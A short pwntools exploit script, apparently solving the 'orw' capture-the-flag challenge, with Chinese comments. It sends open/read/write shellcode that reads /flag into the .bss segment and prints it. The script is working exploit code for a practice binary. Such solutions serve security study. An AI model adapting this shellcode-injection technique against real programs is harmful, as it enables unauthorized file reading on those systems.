# coding=utf-8
from pwn import *
p = process('./orw')

bss_addr = 0x0804A066
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read(3,bss_addr,100)
shellcode += shellcraft.write(1,bss_addr,100)
shellcode = asm(shellcode)

p.recvuntil("shellcode:")
p.sendline(shellcode)
p.interactive()


# 调用pwntools本身自带的shell生成工具，具有生成打开文件/flag的作用，将flag的内容写在.bss段后，再进行读取
# 其本身并不直接弹shell，而是直接以文件内容获取的形式来执行程序控制流
